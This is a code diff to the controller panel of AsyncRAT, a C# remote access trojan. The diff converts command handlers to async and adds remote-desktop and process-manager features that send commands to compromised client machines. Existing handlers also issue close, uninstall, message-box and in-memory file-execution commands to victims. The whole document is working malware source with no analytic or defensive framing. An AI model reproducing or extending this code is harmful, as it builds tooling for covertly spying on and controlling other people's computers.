@@ -8,6 +8,7 @@ using System.Linq;
 using System.Threading;
 using System.Drawing;
 using System.IO;
+using AsyncRAT_Sharp.Forms;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -66,7 +67,7 @@ namespace AsyncRAT_Sharp
         }
 
 
-        private void ping_Tick(object sender, EventArgs e)
+        private async void ping_Tick(object sender, EventArgs e)
         {
             if (Settings.Online.Count > 0)
             {
@@ -75,7 +76,7 @@ namespace AsyncRAT_Sharp
                 msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                 foreach (Clients CL in Settings.Online.ToList())
                 {
-                    Task.Run(() =>
+                    await Task.Run(() =>
                     {
                         CL.BeginSend(msgpack.Encode2Bytes());
                     });
@@ -89,7 +90,7 @@ namespace AsyncRAT_Sharp
             toolStripStatusLabel1.Text = string.Format("Online {0}     Sent {1}     Received {2}", Settings.Online.Count.ToString(), Helper.BytesToString(Settings.Sent).ToString(), Helper.BytesToString(Settings.Received).ToString());
         }
 
-        private void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -97,7 +98,7 @@ namespace AsyncRAT_Sharp
                 msgpack.ForcePathObject("Packet").AsString = "close";
                 foreach (ListViewItem C in listView1.SelectedItems)
                 {
-                    Task.Run(() =>
+                    await Task.Run(() =>
                     {
                         Clients CL = (Clients)C.Tag;
                         CL.BeginSend(msgpack.Encode2Bytes());
@@ -106,7 +107,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -120,7 +121,7 @@ namespace AsyncRAT_Sharp
                     msgpack.ForcePathObject("Message").AsString = Msgbox;
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        Task.Run(() =>
+                        await Task.Run(() =>
                         {
                             Clients CL = (Clients)C.Tag;
                             CL.BeginSend(msgpack.Encode2Bytes());
@@ -162,7 +163,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -170,7 +171,7 @@ namespace AsyncRAT_Sharp
                 msgpack.ForcePathObject("Packet").AsString = "uninstall";
                 foreach (ListViewItem C in listView1.SelectedItems)
                 {
-                    Task.Run(() =>
+                    await Task.Run(() =>
                     {
                         Clients CL = (Clients)C.Tag;
                         CL.BeginSend(msgpack.Encode2Bytes());
@@ -211,7 +212,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -235,7 +236,7 @@ namespace AsyncRAT_Sharp
 
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        Task.Run(() =>
+                        await Task.Run(() =>
                         {
                             Clients CL = (Clients)C.Tag;
                             CL.BeginSend(msgpack.Encode2Bytes());
@@ -244,6 +245,77 @@ namespace AsyncRAT_Sharp
                     }
                 }
                 SF.Close();
+            }
+        }
+
+        private async void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "true";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        await Task.Run(() =>
+                        {
+                            Clients CL = (Clients)C.Tag;
+                            this.BeginInvoke((MethodInvoker)(() =>
+                            {
+                                RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + CL.ID];
+                                if (RD == null)
+                                {
+                                    RD = new RemoteDesktop
+                                    {
+                                        Name = "RemoteDesktop:" + CL.ID,
+                                        F = this,
+                                        Text = "RemoteDesktop:" + CL.ID,
+                                        C = CL,
+                                        Active = true
+                                    };
+                                    RD.Show();
+                                    CL.BeginSend(msgpack.Encode2Bytes());
+                                }
+                            }));
+                        });
+                    }
+                }
+            }
+        }
+
+        private async void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "processManager";
+                    msgpack.ForcePathObject("Option").AsString = "List";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        await Task.Run(() =>
+                        {
+                            Clients CL = (Clients)C.Tag;
+                            this.BeginInvoke((MethodInvoker)(() =>
+                            {
+                                ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + CL.ID];
+                                if (PM == null)
+                                {
+                                    PM = new ProcessManager
+                                    {
+                                        Name = "processManager:" + CL.ID,
+                                        Text = "processManager:" + CL.ID,
+                                        F = this,
+                                        C = CL
+                                    };
+                                    PM.Show();
+                                    CL.BeginSend(msgpack.Encode2Bytes());
+                                }
+                            }));
+                        });
+                    }
+                }
             }
         }
     }
